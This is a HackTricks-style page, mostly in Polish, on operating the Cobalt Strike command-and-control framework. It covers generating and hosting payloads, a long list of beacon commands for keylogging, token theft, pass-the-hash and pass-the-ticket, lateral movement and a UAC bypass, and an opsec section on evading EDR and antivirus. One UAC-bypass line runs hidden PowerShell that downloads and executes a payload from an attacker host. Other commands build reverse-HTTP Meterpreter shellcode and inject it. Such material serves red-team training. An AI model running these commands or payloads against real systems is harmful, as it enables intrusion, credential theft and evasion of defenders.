# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` następnie możesz wybrać gdzie nasłuchiwać, jaki rodzaj beacon użyć (http, dns, smb...) i więcej.

### Peer2Peer Listeners

Beacons tych listeners nie muszą komunikować się bezpośrednio z C2, mogą komunikować się z nim przez inne beacons.

`Cobalt Strike -> Listeners -> Add/Edit` następnie musisz wybrać TCP lub SMB beacons

* The **TCP beacon will set a listener in the port selected**. Aby połączyć się z TCP beacon użyj polecenia `connect <ip> <port>` z innego beacona
* The **smb beacon will listen in a pipename with the selected name**. Aby połączyć się z SMB beacon musisz użyć polecenia `link [target] [pipe]`.

### Generowanie i hostowanie payloadów

#### Generowanie payloadów do plików

`Attacks -> Packages ->`

* **`HTMLApplication`** dla plików HTA
* **`MS Office Macro`** dla dokumentu Office z makrem
* **`Windows Executable`** dla .exe, .dll lub service .exe
* **`Windows Executable (S)`** dla **stageless** .exe, .dll lub service .exe (lepsze stageless niż staged, mniej IoCs)

#### Generowanie i hostowanie payloadów

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` spowoduje wygenerowanie skryptu/plik wykonywalnego pobierającego beacon z Cobalt Strike w formatach takich jak: bitsadmin, exe, powershell i python

#### Hostowanie payloadów

Jeśli już masz plik, który chcesz hostować na serwerze WWW, przejdź do `Attacks -> Web Drive-by -> Host File` i wybierz plik oraz konfigurację web serwera.

### Beacon Options

<details>
<summary>Opcje i polecenia beacona</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Własne implanty / Linux Beacons

- Niestandardowy agent musi tylko obsługiwać protokół HTTP/S Team Server Cobalt Strike (domyślny malleable C2 profile), aby się zarejestrować/check-in i otrzymywać zadania. Zaimplementuj te same URI/headers/metadata i crypto zdefiniowane w profilu, aby ponownie użyć UI Cobalt Strike do taskowania i zwracania wyników.
- Aggressor Script (np. `CustomBeacon.cna`) może opakować generowanie payloadów dla nie-Windows beacon, dzięki czemu operatorzy mogą wybrać listener i wygenerować ELF payloady bezpośrednio z GUI.
- Przykładowe task handlery Linux wystawione na Team Server: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, oraz `exit`. Mapują się do task ID oczekiwanych przez Team Server i muszą być zaimplementowane po stronie serwera, aby zwracać output w odpowiednim formacie.
- Wsparcie BOF na Linux można dodać ładując Beacon Object Files in-process za pomocą [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (obsługuje też Outflank-style BOFs), co pozwala modularny post-exploitation działający w kontekście/uprawnieniach implanta bez tworzenia nowych procesów.
- Osadź handler SOCKS w custom beacon, aby zachować parytet pivotingu z Windows Beacons: kiedy operator uruchomi `socks <port>` implant powinien otworzyć lokalny proxy do routowania narzędzi operatora przez skompromitowany host Linux do sieci wewnętrznych.

## Opsec

### Execute-Assembly

The **`execute-assembly`** używa **sacrificial process** i remote process injection do wykonania wskazanego programu. To jest bardzo głośne, ponieważ do injekcji w proces używane są pewne Win API, które każda EDR sprawdza. Jednak istnieją narzędzia pozwalające załadować coś w tym samym procesie:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- W Cobalt Strike możesz też użyć BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Agressor script `https://github.com/outflanknl/HelpColor` utworzy w Cobalt Strike komendę `helpx`, która doda kolory do komend wskazujące, czy są to BOFy (zielone), czy Fork&Run (żółte) i podobne, lub czy są ProcessExecution, injection itp. (czerwone). Pomaga to wiedzieć, które komendy są bardziej stealthy.

### Act as the user

Możesz sprawdzać zdarzenia takie jak `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Sprawdź wszystkie interactive logons, aby poznać zwykłe godziny pracy.
- System EID 12,13 - Sprawdź częstotliwość shutdown/startup/sleep.
- Security EID 4624/4625 - Sprawdź przychodzące poprawne/niepoprawne NTLM próby.
- Security EID 4648 - To zdarzenie powstaje, gdy użyto plaintext credentials do logowania. Jeśli proces je wygenerował, binarka potencjalnie ma credentials w clear text w pliku konfiguracyjnym lub wewnątrz kodu.

Kiedy używasz `jump` z Cobalt Strike, lepiej użyć metody `wmi_msbuild`, aby nowy proces wyglądał bardziej legit.

### Use computer accounts

Obrońcy często wykluczają z monitoringu podejrzane zachowania generowane przez użytkowników oraz **exclude service accounts and computer accounts like `*$` z ich monitoringu**. Możesz użyć tych kont do lateral movement lub privilege escalation.

### Use stageless payloads

Stageless payloads są mniej głośne niż staged, ponieważ nie muszą pobierać drugiego etapu z C2. Oznacza to, że nie generują ruchu sieciowego po initial connection, co zmniejsza szansę wykrycia przez defensywy sieciowe.

### Tokens & Token Store

Bądź ostrożny, gdy kradziesz lub generujesz tokeny, bo EDR może enumerować wszystkie tokeny wszystkich wątków i znaleźć **token należący do innego użytkownika** lub nawet SYSTEM w procesie.

Warto przechowywać tokeny **per beacon**, żeby nie trzeba było ciągle kraść tego samego tokenu. Przydatne przy lateral movement lub gdy trzeba użyć skradzionego tokenu wielokrotnie:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- `token-store show`
- `token-store use <id>`
- `token-store remove <id>`
- `token-store remove-all`

Przy ruchu lateralnym zwykle lepiej jest **ukraść token niż wygenerować nowy** albo wykonać pass-the-hash.

### Guardrails

Cobalt Strike ma funkcję nazwaną **Guardrails**, która pomaga zapobiegać użyciu niektórych komend lub akcji, które mogą być wykryte przez obrońców. Guardrails można skonfigurować, aby blokować konkretne komendy, takie jak `make_token`, `jump`, `remote-exec` i inne, często używane do lateral movement lub privilege escalation.

Dodatkowo repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) zawiera też kontrolki i pomysły, które warto rozważyć przed wykonaniem payloadu.

### Tickets encryption

W AD uważaj na encryption ticketów. Domyślnie niektóre narzędzia będą używać RC4 dla Kerberos tickets, co jest mniej bezpieczne niż AES, a w aktualnych środowiskach domyślnie używa się AES. To może być wykryte przez obrońców monitorujących słabe algorytmy szyfrowania.

### Avoid Defaults

Używając Cobalt Stricke domyślnie SMB pipe'y będą miały nazwy `msagent_####` i `status_####`. Zmień te nazwy. Można sprawdzić nazwy istniejących pipe'ów z Cobal Strike komendą: `ls \\.\pipe\`

Dodatkowo, przy sesjach SSH tworzony jest pipe o nazwie `\\.\pipe\postex_ssh_####`. Zmień go z `set ssh_pipename "<new_name>";`.

Również w poext exploitation attack pipe'y `\\.\pipe\postex_####` można zmodyfikować z `set pipename "<new_name>"`.

W profilach Cobalt Strike możesz też modyfikować rzeczy takie jak:

- Nie używać `rwx`
- Jak zachowuje się process injection (które API będą używane) w bloku `process-inject {...}`
- Jak działa "fork and run" w bloku `post-ex {…}`
- Czas sleep
- Maksymalny rozmiar binarek ładowanych do pamięci
- Memory footprint i zawartość DLL przez blok `stage {...}`
- Ruch sieciowy

### Bypass memory scanning

Niektóre EDR skanują pamięć pod kątem znanych sygnatur malware. Cobalt Strike pozwala zmodyfikować funkcję `sleep_mask` jako BOF, który będzie w stanie zaszyfrować backdoora w pamięci.

### Noisy proc injections

Iniekcje kodu do procesu są zwykle bardzo głośne, ponieważ **żaden zwykły proces zwykle tego nie wykonuje i sposoby na to są bardzo ograniczone**. W związku z tym mogą być wykryte przez behavior-based detection systems. Ponadto EDR może skanować sieć w poszukiwaniu **wątków zawierających kod, który nie pochodzi z dysku** (chociaż procesy takie jak przeglądarki używające JIT robią to powszechnie). Przykład: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Przy spawnowaniu nowego procesu ważne jest, aby **utrzymać prawidłową relację parent-child** między procesami, by uniknąć wykrycia. Jeśli svchost.exec uruchamia iexplorer.exe to będzie wyglądać podejrzanie, bo svchost.exe nie jest zwykle parentem iexplorer.exe w normalnym Windows.

Gdy nowy beacon jest spawnowany w Cobalt Strike domyślnie tworzy się proces używający **`rundll32.exe`** do uruchomienia nowego listenera. To nie jest bardzo stealthy i może być łatwo wykryte przez EDR. Dodatkowo `rundll32.exe` jest uruchamiany bez argumentów, co czyni to jeszcze bardziej podejrzanym.

Za pomocą następującej komendy Cobalt Strike możesz określić inny proces do spawnnięcia nowego beacona, czyniąc go mniej wykrywalnym:
```bash
spawnto x86 svchost.exe
```
Możesz także zmienić to ustawienie **`spawnto_x86` i `spawnto_x64`** w profilu.

### Proxyowanie ruchu atakującego

Atakującym czasami będzie potrzebne uruchamianie narzędzi lokalnie, nawet na maszynach z Linuxem, i sprawić, by ruch ofiar docierał do tego narzędzia (np. NTLM relay).

Ponadto, czasami przy ataku pass-the.hash lub pass-the-ticket bardziej dyskretne dla atakującego jest **dodanie tego hasha lub ticketu do własnego procesu LSASS** lokalnie, a następnie pivotować z niego zamiast modyfikowania procesu LSASS na maszynie ofiary.

Jednak musisz być **ostrożny z generowanym ruchem**, ponieważ możesz wysyłać nietypowy ruch (np. kerberos?) z procesu backdoora. W tym celu możesz pivotować do procesu przeglądarki (choć możesz zostać złapany przy injectingu do procesu, więc przemyśl sposób na ukrycie tego).


### Avoiding AVs

#### AV/AMSI/ETW Bypass

Sprawdź stronę:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Zazwyczaj w `/opt/cobaltstrike/artifact-kit` znajdziesz kod i pre-kompilowane szablony (w `/src-common`) payloadów, które cobalt strike użyje do wygenerowania binarnych beaconów.

Używając [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) z wygenerowanym backdoorem (lub tylko ze skompilowanym szablonem) możesz znaleźć, co wywołuje alarmy defendera. Zwykle jest to ciąg znaków. W takim wypadku możesz po prostu zmodyfikować kod generujący backdoora, aby ten ciąg nie pojawił się w końcowym binarium.

Po zmodyfikowaniu kodu uruchom `./build.sh` z tego samego katalogu i skopiuj folder `dist-pipe/` do klienta Windows w `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Nie zapomnij załadować agresywnego skryptu `dist-pipe\artifact.cna`, aby wskazać Cobalt Strike, by używał zasobów z dysku, które chcemy, a nie tych już załadowanych.

#### Resource Kit

Folder ResourceKit zawiera szablony payloadów opartych na skryptach dla Cobalt Strike, w tym PowerShell, VBA i HTA.

Używając [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) razem z szablonami możesz ustalić, czego Defender (w tym przypadku AMSI) nie toleruje i odpowiednio to zmodyfikować:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modyfikując wykryte linie, można wygenerować szablon, który nie zostanie wykryty.

Nie zapomnij załadować agresywnego skryptu `ResourceKit\resources.cna`, aby wskazać Cobalt Strike, żeby użył zasobów z dysku, które chcemy, a nie tych wczytanych.

#### Function hooks | Syscall

Hookowanie funkcji to bardzo powszechna metoda stosowana przez ERDs do wykrywania złośliwej aktywności. Cobalt Strike pozwala ominąć te hooki poprzez użycie **syscalls** zamiast standardowych wywołań Windows API przy konfiguracji **`None`**, albo użyć wersji `Nt*` funkcji z ustawieniem **`Direct`**, albo po prostu przeskoczyć funkcję `Nt*` przy użyciu opcji **`Indirect`** w profilu malleable. W zależności od systemu jedna opcja może być bardziej stealth niż inna.

Można to ustawić w profilu lub używając polecenia **`syscall-method`**

Jednak może to również być "noisy" — wywoływać wykrycia/alerty.

Jedną z opcji udostępnionych przez Cobalt Strike do ominięcia hooków funkcji jest usunięcie tych hooków za pomocą: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Możesz też sprawdzić, które funkcje są hookowane przy pomocy [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) lub [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Źródła

- [Cobalt Strike Linux Beacon (niestandardowy implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Analiza Unit42 dotycząca szyfrowania metadanych Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [Dziennik SANS ISC o ruchu Cobalt Strike](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
